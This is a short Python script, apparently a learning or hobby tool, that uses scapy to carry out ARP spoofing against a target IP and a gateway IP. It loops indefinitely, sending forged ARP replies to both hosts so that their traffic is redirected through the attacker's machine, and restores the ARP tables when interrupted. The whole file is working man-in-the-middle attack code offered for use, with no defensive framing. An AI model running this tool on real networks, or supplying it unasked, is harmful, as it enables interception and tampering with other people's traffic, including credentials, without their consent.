#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target",help="Target IP Address")
    parser.add_argument("-g","--gateway",dest="gateway",help="Gateway IP Address\nExample: python3 arp_spoofer.py -t 10.0.1.7 -g 10.0.1.1")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target's IP address, use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)    
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac_address = get_mac(target_ip)
    arp_response_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac_address,psrc=spoof_ip) 
    scapy.send(arp_response_packet,verbose=False)


def restore(destination_ip,source_ip):
    destination_mac_address = get_mac(destination_ip)
    source_mac_address = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac_address,psrc=source_ip,hwsrc=source_mac_address)
    scapy.send(packet,count=4,verbose=False)


sending_packets_count = 0
options = get_arguments()
target_ip=options.target
gateway_ip=options.gateway

try:
    while True: 
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sending_packets_count = sending_packets_count + 2
        print("\r[+] Sent packets: "+str(sending_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C...Resetting ARP Tables...Please Wait!! \n")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)


